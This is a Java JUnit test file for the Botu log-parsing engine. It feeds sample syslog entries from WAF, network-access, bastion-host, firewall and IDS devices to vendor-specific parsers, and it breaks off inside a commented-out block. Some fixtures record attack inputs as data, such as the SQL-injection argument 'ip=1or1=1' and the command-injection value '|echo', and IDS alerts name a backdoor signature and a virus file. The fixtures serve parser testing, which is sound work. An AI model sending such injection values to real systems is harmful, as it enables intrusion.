package org.datayoo.botu.engine;

import junit.framework.TestCase;
import org.datayoo.botu.BotuListener;
import org.datayoo.botu.metadata.ConstantMetadata;
import org.datayoo.botu.metadata.ExpressionType;
import org.datayoo.botu.metadata.MethodMetadata;
import org.datayoo.botu.metadata.VariableMetadata;
import org.datayoo.botu.operand.factory.BotuOperandFactory;
import org.datayoo.botu.operand.factory.BotuProcessOperandFactory;
import org.datayoo.botu.operand.function.parse.KeyPositionSplitParse;
import org.datayoo.moql.EntityMap;
import org.datayoo.moql.EntityMapImpl;
import org.datayoo.moql.MapEntry;

import java.io.IOException;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Properties;

public class BotuParserTest extends TestCase {

  protected Properties buildProperties() {
    String schemaDir = "./resources/schemas";
    String dicDir = "./resources/dictionaries";
    Properties properties = new Properties();
    properties.setProperty(BotuProcessOperandFactory.BOTU_SCHEMA_DIR,
        schemaDir);
    properties.setProperty(BotuProcessOperandFactory.BOTU_SCHEMA_FILE_PATTERN,
        ".*\\.sch");
    properties.setProperty(BotuProcessOperandFactory.BOTU_DICT_DIR, dicDir);
    properties.setProperty(BotuProcessOperandFactory.BOTU_DICT_FILE_PATTERN,
        ".*\\.dict");
    return properties;
  }

  public void testWAFWebrayJson() {
    String parserFile = "./resources/parsers/waf_webray_raywaf_json.bo";
    Properties properties = buildProperties();

    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "{\"syslog\":{\"r_time_i\":1614046529,\"r_time_s\":\"2021-02-23,10:15:29\",\"r_sip_i\":3232238880,\"r_sip_s\":\"192.168.13.32\",\"r_xip_i\":3232238880,\"r_xip\":\"192.168.13.32\",\"r_dip_i\":3232238880,\"r_dip_s\":\"192.168.13.32\",\"r_sport\":61198,\"r_dport\":80,\"r_policyid\":4294967294,\"r_ruleid\":1,\"r_itemid\":0,\"r_type\":51,\"r_type_name\":\"SQLInjectionProtection\",\"r_protection\":2,\"r_protection_name\":\"WEB\",\"r_severity\":2,\"r_severity_name\":HIGH,\"r_protocol\":6,\"r_protocol_name\":\"TCP\",\"r_layer\":4,\"r_layer_name\":FTP,\"extra0\":0,\"extra1\":0,\"r_code\":10010,\"r_match_ofs\":\"4\",\"r_match_len\":\"7\",\"r_atk\":\"ip=1or1=1\",\"r_action\":0,\"r_actiondetails\":\"ACCEPT\",\"wafid\":\"0\",\"r_device\":\"waf\",\"userid\":0,\"g_serverid\":0,\"c_country\":\"\",\"c_province\":\"localareanetwork\",\"r_city\":\"\",\"r_area\":\"\",\"r_hp\":\"0\",\"r_hp_name\":\"RequsetHeader\",\"r_attackfiled\":\"5\",\"r_method\":\"1\",\"r_method_name\":\"GET\",\"r_hostname\":\"192.168.13.190\",\"r_url\":\"/\",\"r_args\":\"ip=1or1=1\",\"r_hdr\":\"Host:192.168.13.190\\r\\nUser-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:85.0)Gecko/20100101Firefox/85.0\\r\\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\\r\\nAccept-Encoding:gzip,deflate\\r\\nConnection:keep-alive\\r\\nUpgrade-Insecure-Requests:1\\r\\n\",\"r_post\":\"\",\"r_rsp_hdr\":\"\",\"r_rsp_body\":\"\",\"r_xffip\":\"\",\"r_cdnip\":\"\",\"equipment\":\"2\",\"os\":\"7\",\"browser\":\"5\"}}";
/*      parse(botuEngine, data);
      data = "{\"syslog\":{\"r_time_i\":1614220744,\"r_time_s\":\"2021-02-2510:39:04\",\"r_sip_i\":3232238880,\"r_sip_s\":\"192.168.13.32\",\"r_xip_i\":3232238880,\"r_xip\":\"192.168.13.32\",\"r_dip_i\":3232239038,\"r_dip_s\":\"192.168.13.190\",\"r_sport\":29029,\"r_dport\":80,\"r_policyid\":1,\"r_ruleid\":0,\"r_itemid\":0,\"r_type\":155,\"r_type_name\":\"SYNFlood\",\"r_protection\":6,\"r_protection_name\":\"DdosProtection\",\"r_severity\":1,\"r_severity_name\":MID,\"r_protocol\":6,\"r_protocol_name\":\"TCP\",\"r_layer\":1,\"r_layer_name\":FTP,\"extra0\":0,\"extra1\":0,\"r_code\":0,\"r_match_ofs\":\"0\",\"r_match_len\":\"0\",\"r_atk\":\"\",\"r_action\":0,\"r_actiondetails\":\"CONTINUE\",\"wafid\":\"0\",\"r_device\":\"waf\",\"userid\":0,\"g_serverid\":0,\"c_country\":\" \",\"c_province\":\"local area network\",\"r_city\":\" \",\"r_area\":\" \"}}";
      parse(botuEngine, data);
      data = "{\"syslog\":{\"r_time_i\":1614227208,\"r_time_s\":\"2021-02-25 12:26:48\",\"r_sip_i\":3232238880,\"r_sip_s\":\"192.168.13.32\",\"r_xip_i\":3232238880,\"r_xip\":\"192.168.13.32\",\"r_dip_i\":1875804282,\"r_dip_s\":\"111.206.128.122\",\"r_sport\":57333,\"r_dport\":80,\"r_policyid\":1,\"r_ruleid\":0,\"r_itemid\":0,\"r_type\":236,\"r_type_name\":\"Malicioussoftware\",\"r_protection\":11,\"r_protection_name\":\"IDP\",\"r_severity\":1,\"r_severity_name\":MID,\"r_protocol\":6,\"r_protocol_name\":\"TCP\",\"r_layer\":4,\"r_layer_name\":FTP,\"extra0\":0,\"extra1\":0,\"r_code\":50142,\"r_match_ofs\":\"186\",\"r_match_len\":\"14\",\"r_atk\":\"Host: collect.kugou.com\\r\\nConnection: keep-alive\\r\\nContent-Length: 2352\\r\\nContent-Type: application/octet-stream\\r\\nKG-RC: 1\\r\\nKG-Rec: 1\\r\\nKG-THash: carrier_pigeon_protocol.cpp:1257326481:407\\r\\nUser-Agent: \\r\\nAccept-Encoding:gzip,deflate\\r\\n\",\"r_action\":0,\"r_actiondetails\":\"ACCEPT\",\"wafid\":\"0\",\"r_device\":\"waf\",\"userid\":0,\"g_serverid\":0,\"c_country\":\" \",\"c_province\":\"local area network\",\"r_city\":\" \",\"r_area\":\" \",\"r_hp\":\"0\",\"r_hp_name\":\"Requset Header\",\"r_attackfiled\":\"1\",\"r_method\":\"3\",\"r_method_name\":\"POST\",\"r_hostname\":\"collect.kugou.com\",\"r_url\":\"/v2/post\",\"r_args\":\"Host:collect.kugou.com\\r\\nConnection:keep-alive\\r\\nContent-Length:2352\\r\\nContent-Type:application/octet-stream\\r\\nKG-RC:1\\r\\nKG-Rec:1\\r\\nKG-THash:carrier_pigeon_protocol.cpp:1257326481:407\\r\\nUser-Agent:\\r\\nAccept-Encoding:gzip,deflate\\r\\n\",\"r_hdr\":\"Host:collect.kugou.com\\r\\nConnection:keep-alive\\r\\nContent-Length:2352\\r\\nContent-Type:application/octet-stream\\r\\nKG-RC:1\\r\\nKG-Rec:1\\r\\nKG-THash:carrier_pigeon_protocol.cpp:1257326481:407\\r\\nUser-Agent:\\r\\nAccept-Encoding:gzip,deflate\\r\\n\\r\\n\",\"r_post\":\"\",\"r_rsp_hdr\":\"Server: openresty\\r\\nDate: Thu, 25 Feb 2021 07:42:48 GMT\\r\\nContent-Type:application/json\\r\\nTransfer-Encoding:chunked\\r\\nConnection:keep-alive\\r\\n\\r\\n\\r\\n\",\"r_rsp_body\":{\"status\":\"1\",\"errcode\":\"0\"},\"r_xffip\":\"\",\"r_cdnip\":\" \",\"equipment\":\"0\",\"os\":\"0\",\"browser\":\"0\"}}";
      parse(botuEngine, data);
      data = "<188>Nov 27 13:29:22 RayOS 2021-04-14 10:12:22 WAF: 117.204.213.99:1344->172.18.6.99 dip=172.18.6.99  {\"syslog\":{\"r_time_i\":1614227208,\"r_time_s\":\"2021-02-25 12:26:48\",\"r_sip_i\":3232238880,\"r_sip_s\":\"192.168.13.32\",\"r_xip_i\":3232238880,\"r_xip\":\"192.168.13.32\",\"r_dip_i\":1875804282,\"r_dip_s\":\"111.206.128.122\",\"r_sport\":57333,\"r_dport\":80,\"r_policyid\":1,\"r_ruleid\":0,\"r_itemid\":0,\"r_type\":236,\"r_type_name\":\"Malicioussoftware\",\"r_protection\":11,\"r_protection_name\":\"IDP\",\"r_severity\":1,\"r_severity_name\":MID,\"r_protocol\":6,\"r_protocol_name\":\"TCP\",\"r_layer\":4,\"r_layer_name\":FTP,\"extra0\":0,\"extra1\":0,\"r_code\":50142,\"r_match_ofs\":\"186\",\"r_match_len\":\"14\",\"r_atk\":\"Host: collect.kugou.com\\r\\nConnection: keep-alive\\r\\nContent-Length: 2352\\r\\nContent-Type: application/octet-stream\\r\\nKG-RC: 1\\r\\nKG-Rec: 1\\r\\nKG-THash: carrier_pigeon_protocol.cpp:1257326481:407\\r\\nUser-Agent: \\r\\nAccept-Encoding:gzip,deflate\\r\\n\",\"r_action\":0,\"r_actiondetails\":\"ACCEPT\",\"wafid\":\"0\",\"r_device\":\"waf\",\"userid\":0,\"g_serverid\":0,\"c_country\":\" \",\"c_province\":\"local area network\",\"r_city\":\" \",\"r_area\":\" \",\"r_hp\":\"0\",\"r_hp_name\":\"Requset Header\",\"r_attackfiled\":\"1\",\"r_method\":\"3\",\"r_method_name\":\"POST\",\"r_hostname\":\"collect.kugou.com\",\"r_url\":\"/v2/post\",\"r_args\":\"Host:collect.kugou.com\\r\\nConnection:keep-alive\\r\\nContent-Length:2352\\r\\nContent-Type:application/octet-stream\\r\\nKG-RC:1\\r\\nKG-Rec:1\\r\\nKG-THash:carrier_pigeon_protocol.cpp:1257326481:407\\r\\nUser-Agent:\\r\\nAccept-Encoding:gzip,deflate\\r\\n\",\"r_hdr\":\"Host:collect.kugou.com\\r\\nConnection:keep-alive\\r\\nContent-Length:2352\\r\\nContent-Type:application/octet-stream\\r\\nKG-RC:1\\r\\nKG-Rec:1\\r\\nKG-THash:carrier_pigeon_protocol.cpp:1257326481:407\\r\\nUser-Agent:\\r\\nAccept-Encoding:gzip,deflate\\r\\n\\r\\n\",\"r_post\":\"\",\"r_rsp_hdr\":\"Server: openresty\\r\\nDate: Thu, 25 Feb 2021 07:42:48 GMT\\r\\nContent-Type:application/json\\r\\nTransfer-Encoding:chunked\\r\\nConnection:keep-alive\\r\\n\\r\\n\\r\\n\",\"r_rsp_body\":{\"status\":\"1\",\"errcode\":\"0\"},\"r_xffip\":\"\",\"r_cdnip\":\" \",\"equipment\":\"0\",\"os\":\"0\",\"browser\":\"0\"}}";
      parse(botuEngine, data);
      data = "<188>Apr 20 13:32:44 WAF :2021-04-20 13:32:44 DDOS: devicename=waf sip=172.18.0.52 sport=53 dip=172.18.6.16 dport=6044 ipproto=UDP attack=DNS Cache_Poison url=  host=  cdnip=  xff=172.18.0.52 grade=1 ecount=1 country=  province=local area network";
      parse(botuEngine, data);
      data = "<188>Apr 21 09:34:59 WAF :2021-04-21 09:34:59 WAF: 172.18.1.37:138->172.18.255.255 devicename=waf url=  method=UNKNOWN args=  flag_field=  block_time=0 http_type=  attack_field=0 profile_id=0 rule_id=0 type=Black IP severity=1  action=2  referer=  useragent=  post=  xip=172.18.1.37 code=0 country=  province=local area network |";
      parse(botuEngine, data);
      data = "<52>AuditLog - WARNING - {\"r_time\": \"2021-05-19 15:26:30\", \"r_loglevel_name\": \"Informational\", \"r_operator\": \"liangyan\", \"r_role_name\": \"admin operator\", \"r_sip\": \"192.168.32.5\", \"r_logintype_name\": \"WEB\", \"r_role\": \"1\", \"r_actionid\": \"ACTION_ID_43_81\", \"r_loglevel\": \"SYSLOG_LEVEL_6\", \"r_model_name\": \"-\", \"r_action_name\": 0, \"r_action\": \"[\\u5f00\\u542f] Syslog configuration type [\\\"JSON\\u683c\\u5f0f\\\"] successfully\", \"r_logintype  \": \"1\", \"r_modelid\": \"MODEL_ID_43\"}";
      parse(botuEngine, data);
      data = "<188>May 27 17:26:42 WAF :{\"syslog\":{\"r_time_i\":1622107602,\"r_time_s\":\"2021-05-27 17:26:42\", \"r_sip_i\":2886862372,\"r_sip_s\":\"172.18.6.36\",\"r_xip_i\":2886862372,\"r_xip\":\"172.18.6.36\",\"r_dip_i\":2886860852,\"r_dip_s\":\"172.18.0.52\", \"r_sport\":0,\"r_dport\":0,\"r_policyid\":1,\"r_ruleid\":0,\"r_itemid\":0, \"r_type\":152,\"r_type_name\":\"Danger IP Option\",\"r_protection\":6,\"r_protection_name\":\"Ddos Protection\", \"r_severity\":1,\"r_severity_name\":\"MID\",\"r_protocol\":6,\"r_protocol_name\":\"TCP\", \"r_layer\":1,\"r_layer_name\":\"FTP\",\"extra0\":0,\"extra1\":0,\"r_code\":0,\"r_match_ofs\":0,\"r_match_len\":0, \"r_atk\":\" \",\"r_action\":0,\"r_actiondetails\":\"PASS\",\"wafid\":\"0\",\"r_device\":\"waf\",\"userid\":0,\"g_serverid\":0, \"c_country\":\" \",\"c_province\":\"local area network\",\"r_city\":\" \",\"r_area\":\" \"}}";
      parse(botuEngine, data);*/
      data = "<188>Jun 27 15:21:44 WAF :{\"syslog\":{\"r_time_i\":1687850504,\"r_time_s\":\"2023-06-27 15:21:44\",\"r_sip_i\":2886861245,\"r_sip_s\":\"172.18.1.189\",\"r_xip_i\":2886861245,\"r_xip\":\"172.18.1.189\",\"r_dip_i\":2886861052,\"r_dip_s\":\"172.18.0.252\",\"r_sport\":29508,\"r_dport\":10012,\"r_policyid\":4294967295,\"r_ruleid\":2,\"r_itemid\":0,\"r_type\":52,\"r_type_name\":\"OS Injection Protection\",\"r_protection\":2,\"r_protection_name\":\"WEB\",\"r_severity\":2,\"r_severity_name\":\"HIGH\",\"r_protocol\":6,\"r_protocol_name\":\"TCP\",\"r_layer\":4,\"r_layer_name\":\"HTTP\",\"extra0\":0,\"extra1\":0,\"r_code\":14010,\"r_match_ofs\":0,\"r_match_len\":5,\"r_atk\":\"|echo\",\"r_action\":1,\"r_actiondetails\":\"PASS\",\"wafid\":\"0\",\"r_device\":\"waf\",\"userid\":0,\"g_serverid\":0,\"r_serverid\":4294967294,\"c_country\":\"\",\"c_province\":\"local area network\",\"r_city\":\"\",\"r_area\":\"\",\"r_hp\":\"0\",\"r_hp_name\":\"Requset Header\",\"r_attackfiled\":\"5\",\"r_method\":\"1\",\"r_method_name\":\"GET\",\"r_hostname\":\"172.18.0.252:10012\",\"r_url\":\"/cgi-bin/test-cgi.bat\",\"r_args\":\"|echo\",\"r_hdr\":\"Host: 172.18.0.252:10012\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36\\r\\nAccept-Encoding: gzip, deflate\\r\\nAccept: */*\\r\\nConnection: keep\",\"r_post\":\"\",\"r_rsp_hdr\":\"\",\"r_rsp_body\":\"\",\"r_xffip\":\" \",\"r_cdnip\":\" \",\"equipment\":\"2\",\"os\":\"7\",\"browser\":\"2\"}}";
      parse(botuEngine, data);
      //      data = "<52>AuditLog - WARNING - 2021-05-19 15:24:22-:1 admin through 1 from 192.168.32.11 1 100001 6 | User [\"admin\"] logout |\n";
      //      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testEPSInfoGo() {
    String parserFile = "./resources/parsers/nac_infogo_asm6000_warn.bo";
    Properties properties = buildProperties();

    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "Nov  25 13:49:51 asm processor_server: classid:304, level:1, devid:11, devip:192.168.44.50, devname:, content:[192.168.44.50]非法外联";
      parse(botuEngine, data);
      data = "Apr  1 15:24:48 asm processor_server: classid:202, level:3, devid:1168, devip:20.74.1.76, devname:, content:在交换机[20.74.1.76:Ethernet1/0/15]发现[2]组MAC[F4:30:B9:2A:EE:35-/6C:0B:84:99:B5:6F-/]";
      parse(botuEngine, data);
      data = "Apr  1 15:26:49 asm processor_server: classid:200, level:3, devid:8010, devip:20.74.19.60, devname:, content:网络设备[20.74.19.60]登陆异常，原因: ssh登陆超时。";
      parse(botuEngine, data);
      data = "Apr  1 16:28:25 asm processor_server: classid:301, level:3, devid:6617, devip:22.74.72.9, devname:PC-20180525MQGS, content:[PC-20180525MQGS][22.74.72.9]：&nbsp;&nbsp;您的电脑不符合管理员的检查要求并已经超过修复期限，系统已不允许您再使用网络,请立即进行修复！";
      parse(botuEngine, data);
      data = "Apr  2 07:51:29 asm processor_server: classid:305, level:4, devid:3247, devip:22.74.75.150, devname:, content:设备22.74.75.150 44:39:C4:32:6D:9E在2021-04-02 07:48:56违规了系统文件共享设置检查";
      parse(botuEngine, data);
      data = "Apr  2 09:39:19 asm processor_server: classid:305, level:4, devid:4326, devip:22.74.75.158, devname:, content:设备22.74.75.158 2C:F0:5D:11:88:43在2021-04-02 09:38:51违规了屏幕保护设置检查";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testBastionQzsec() {
    String parserFile = "./resources/parsers/bastion_qzsec_ris-aca_warn.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "Dec 27 18:20:13 node01 node1:login(WEB)(INFORMATIONAL)(service=native,identity=admin,from=10.10.67.15,login authorize success)";
      parse(botuEngine, data);
      data = "Dec 27 18:20:13 node01 node1:access(INFORMATIONAL)(id=S01AIA8C8X3QZV,service=tuilogin,server=Centos(10.10.33.30),account=root,identity=admin(admin),from=10.10.67.15)";
      parse(botuEngine, data);
      data = "Dec 27 18:36:39 node01 node1:cmd(NOTICE)(id=SPR9ADXQE020K7,service=cmdcheck,action=confirm(pass),server=Centos(10.10.33.30),account=root,identity=admin(admin),from=10.10.67.15,command=ls-a)";
      parse(botuEngine, data);
      data = "Dec 27 15:58:04 node01 node1:session(WARNING)(id=S2TGD1JJY69K4P,service=sessionReview,server=Centos(10.10.33.30),account=root,identity=test(test),from=10.10.67.15,authorizer=admin,wait for reviewing)";
      parse(botuEngine, data);
      data = "Jun 27 14:33:42 node01 node1:TUILOG(INFORMATIONAL)(id=S0E56FWNPTLV66,service=tuilog,server=10.10.33.30(CentOS),account=root,identity=admin(admin),from=10.10.67.15,action=allow,command=ls)";
      parse(botuEngine, data);
      data = "Feb 28 08:11:24 node01 node1:System status turned to 'yellow'!!!node1";
      parse(botuEngine, data);
      data = "Nov 14 10:25:14 node01 node1:节点“node01”负载过高，请尽快处理。";
      parse(botuEngine, data);
      data = "2020-08-06T14:38:20+08:00 node01 RIS:CLOUDDEVSYNC(INFORMATIONAL)(changeType=Add,resName=420786b3-5cec-44bd-8349-429b77abf652,resIp=192.168.0.53,resType=Linux,updateTime=2020-08-06 14:38:20)";
      parse(botuEngine, data);
      data = "2020-08-06T14:38:20+08:00 node01 RIS:AUDITLOG(INFORMATIONAL)(id=AXPCUkfTZ8qNrv51bB8y,service=configlog,identity=admin(admin),from=10.66.0.98,operate=新建用户,object=user01,result=成功,details=[角色名:ROLE_USER,密码有效期:通同系统配置,加入系统时间:2020-08-06 13:50:38，修改时间:2020-08-06 13:50:38,姓名：用户01,登录修改密码:否,密码类型:手工输入,删除:未删除,帐号:user01,用户ID:110,状态:活动,用户类型:正式用户,部门:ROOT])";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testFWDPtech() {
    String parserFile = "./resources/parsers/firewall_dptech_firewall_syslog.bo";
    Properties properties = buildProperties();

    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<142> 1 10.199.199.22 2017 Dec 28 16:16:00 FW 350560417 NAT444:SessionW 1514448960|1514448961|172.17.16.212|172.17.16.212|63995|172.17.19.23|80|6";
      parse(botuEngine, data);
      data = "<142> 1 10.199.199.22 Dec 28 16:16:01 2017 FW 54 POLICY:Allow 6|118.184.178.162|14071|221.207.254.61|1433|gige0_16|gige0_17";
      parse(botuEngine, data);
      data = "<142> 1 10.199.199.22 Dec 28 16:16:01 2017 FW 1 POLICY:Deny 17|172.17.8.12|53534|224.0.0.252|5355|gige0_16|gige0_17";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testFWFortinet() {
    String parserFile = "./resources/parsers/firewall_fortinet_firewall_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<189>date=2018-04-26 time=14:30:23 devname=Qirui-FW-1 devid=FGT4HD3916800035 logid=0954024577 type=utm subtype=dlp eventtype=dlp level=notice vd=\"root\" filteridx=0 filtertype=none filtercat=none severity=medium policyid=16 sessionid=852983779 epoch=2502859781 eventid=1 user=\"\" srcip=123.57.117.133 srcport=20125 srcintf=\"port11\" dstip=10.30.31.50 dstport=80 dstintf=\"Internal\" proto=6 service=HTTP filetype=unknown sentbyte=783 rcvdbyte=173 direction=incoming action=log-only hostname=\"bankreceive.joinpay.com\" url=\"/netPay_channel_QQ_NATIVE_COFFEE.action\" agent=\"Apache-HttpClient/4.5.3\" filename=\"netPay_channel_QQ_NATIVE_COFFEE.action\" filesize=12 profile=\"default\"";
      parse(botuEngine, data);
      data = "<189>date=2018-04-26 time=14:30:23 devname=Qirui-FW-1 devid=FGT4HD3916800035 logid=0954024577 type=utm subtype=dlp eventtype=dlp level=notice vd=\"root\" filteridx=0 filtertype=none filtercat=none severity=medium policyid=1 sessionid=852983754 epoch=1138821446 eventid=0 user=\"\" srcip=10.30.29.156 srcport=33898 srcintf=\"Internal\" dstip=104.24.102.76 dstport=80 dstintf=\"port11\" proto=6 service=HTTP filetype=unknown sentbyte=647 rcvdbyte=338 direction=incoming action=log-only hostname=\"pay.cocopay.cc\" url=\"/asynNotify/notify/HJZRQQR?r1_MerchantNo=888101900004588&r2_OrderNo=Q11152018042614301563513281&r3_Amount=50.00&r4_Cur=1&r5_Mp=&r6_Status=100&r7_TrxNo=100218042637309433&r8_BankOrderNo=100218042637309433&r9_BankTrxNo=101520285192201804268160312787&ra_PayTime=2018-04-26%2B14%253A30%253A23&rb_DealTime=2018-04-26%2B14%253A30%253A23&rc_BankCode=QQ_NATIVE&hmac=6fa0de41e1970f4bc67675075f8ef1a6&\" agent=\"PlatSystem\" filename=\"HJZRQQR?r1_MerchantNo=888101900004588&r2_OrderNo=Q11152018042614301563513281&r3_Amount=50.00&r4_Cur=1&r5_Mp=&r6_Status=100&r7\" filesize=7 profile=\"default\"";
      parse(botuEngine, data);
      data = "<190>date=2018-04-26 time=14:30:25 devname=Qirui-FW-1 devid=FGT4HD3916800035 logid=1059028704 type=utm subtype=app-ctrl eventtype=app-ctrl-all level=information vd=\"root\" appid=41540 user=\"\" srcip=101.200.106.12 srcport=14911 srcintf=\"Internal\" dstip=10.30.31.50 dstport=443 dstintf=\"port11\" proto=6 service=\"HTTPS\" policyid=3 sessionid=852983885 applist=\"default\" appcat=\"Network.Service\" app=\"SSL_TLSv1.2\" action=pass hostname=\"www.joinpay.com\" url=\"/\" msg=\"Network.Service: SSL_TLSv1.2,\" apprisk=medium";
      parse(botuEngine, data);
      data = "<189>date=2018-04-26 time=14:30:25 devname=Qirui-FW-1 devid=FGT4HD3916800035 logid=0317013312 type=utm subtype=webfilter eventtype=ftgd_allow level=notice vd=\"root\" policyid=1 sessionid=852983896 user=\"\" srcip=10.30.29.106 srcport=51194 srcintf=\"Internal\" dstip=47.91.201.157 dstport=443 dstintf=\"port11\" proto=6 service=HTTPS hostname=\"api.xunyingcloud.com\" profile=\"default\" action=passthrough reqtype=direct url=\"/\" sentbyte=1015 rcvdbyte=3397 direction=outgoing msg=\"URL belongs to an allowed category in policy\" method=domain cat=0 catdesc=\"Unrated\"";
      parse(botuEngine, data);
      data = "<189>date=2018-04-26 time=14:30:25 devname=Qirui-FW-1 devid=FGT4HD3916800035 logid=0000000013 type=traffic subtype=forward level=notice vd=root srcip=101.200.106.9 srcport=19836 srcintf=\"port11\" dstip=59.107.24.250 dstport=80 dstintf=\"Internal\" poluuid=fde2619a-e928-51e7-0bf5-4ac0c16c922c sessionid=852983560 proto=6 action=close policyid=16 dstcountry=\"China\" srccountry=\"China\" trandisp=dnat tranip=10.30.31.50 tranport=80 service=\"HTTP\" appid=15893 app=\"HTTP.BROWSER\" appcat=\"Web.Others\" apprisk=medium applist=\"default\" appact=detected duration=5 sentbyte=3357 rcvdbyte=459 sentpkt=7 rcvdpkt=7 shaperperipname=\"XXXXXXXX\" shaperperipdropbyte=0 utmaction=allow countdlp=2 countapp=1";
      parse(botuEngine, data);
      data = "<189>date=2018-04-26 time=14:30:25 devname=Qirui-FW-1 devid=FGT4HD3916800035 logid=0001000014 type=traffic subtype=local level=notice vd=root srcip=10.20.33.250 srcport=51030 srcintf=\"Internal\" dstip=10.30.39.254 dstport=161 dstintf=\"root\" sessionid=852973656 proto=17 action=accept policyid=0 dstcountry=\"Reserved\" srccountry=\"Reserved\" trandisp=noop service=\"SNMP\" app=\"SNMP\" duration=180 sentbyte=737 rcvdbyte=843 sentpkt=1 rcvdpkt=1 appcat=\"unscanned\"";
      parse(botuEngine, data);
      data = "<189>date=2018-04-26 time=14:30:24 devname=Qirui-FW-1 devid=FGT4HD3916800035 logid=0101037139 type=event subtype=vpn level=notice vd=\"root\" logdesc=\"IPsec phase 2 status changed\" msg=\"IPsec phase 2 status change\" action=phase2-down remip=113.108.207.164 locip=58.67.210.4 remport=500 locport=500 outintf=\"port12\" cookies=\"45938fe3d5ff38ee/0eb14bcc2a7bbde4\" user=\"N/A\" group=\"N/A\" xauthuser=\"N/A\" xauthgroup=\"N/A\" assignip=N/A vpntunnel=\"to office\" phase2_name=to office";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testIDSVenus() {
    String parserFile = "./resources/parsers/ids_venus_tiantian[v7]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<12>Jun 22 12:40:33 (none) : {\"dt\":\"VENUS_IDS_0700R0200B20140925112801\",\"level\":10,\"id\":\"152323088\",\"type\":\"Alert Log\",\"time\":1529642433311,\"source\":{\"ip\":\"103.235.245.98\",\"port\":53029,\"mac\":\"14-14-4b-82-72-b6\"},\"destination\":{\"ip\":\"192.168.7.115\",\"port\":443,\"mac\":\"00-10-f3-36-c1-c8\"},\"protocol\":\"TCP\",\"subject\":\"TCP_建立SSL握手连接\",\"message\":\"nic=1;数据长度=112;TCP数据内容=16 03 01 00 6b 01 00 00 67 03 01 5b 2c 7d c4 7c ea 55 8e 17 dd 9e ee a8 c3 9d 4d 0c e0 41 3a e3 16 a5 03 9d 69 b2 1b 82 b9 25 59 20 62 57 f1 9b 96 2d ec 45 1a 5e 3c e7 1a 9f 41 b3 0d 4f 65 75 7a 3b 9d b7 ca ea 13 b0 f2 a9 7c b8 00 20 00 04 00 05 00 2f 00 33 00 32 00 0a 00 16 00 13 00 09 00 15 00 12 00 03 00 08 00 14 00 11 00 ff 01 00;\"}";
/*      parse(botuEngine, data);
      data = "<12>Jun 22 12:40:33 (none) : {\"dt\":\"VENUS_IDS_0700R0400B20160825151405\",\"level\":30,\"id\":\"152329550\",\"type\":\"Alert Log\",\"time\":1472284770413,\"source\":{\"ip\":\"192.168.10.33\",\"port\":1120,\"mac\":\"00-0c-29-79-f2-f7\"},\"destination\":{\"ip\":\"192.168.10.189\",\"port\":1405,\"mac\":\"00-11-d8-67-5c-c2\"},\"protocol\":\"TCP\",\"subject\":\"TCP_后门_网络红娘_正向连接\",\"message\":\"nic=1;数据长度=28;TCP数据内容=41 3a 00 00 d8 00 00 00 02 00 00 00 30 2e 30 30 47 00 00 00 1f 46 40 00 78 01 00 00;\",\"securityid\":\"5\",\"attackid\":\"7003\"}";
      parse(botuEngine, data);
      data = "<12>Jun 22 12:40:33 (none) : {\"dt\":\"VENUS_CS_0700R0600B20171018144640\",\"virus_name\":\"Virus/Win32.Parite.gh\",\"virus_file_name\":\"Backdoor.Win32.Agent.hj.(3FB0E2520D73EB7C589D8F56D2EED964).cpl\",\"protocol\":\"FTP\",\"src_ip\":\"fa11:1234:1234:1234:1234:1234:1234:27\",\"dst_ip\":\"fa11:1234:1234:1234:1234:1234:1234:26\",\"src_mac\":\"E005C5F37B20\",\"dst_mac\":\"0021CCB9DC4B\",\"src_port\":\"1266\",\"dst_port\":\"21\",\"start_time\":\"1508759104\",\"msg\":\" \",\"event_level\":\"4\"}";
      parse(botuEngine, data);
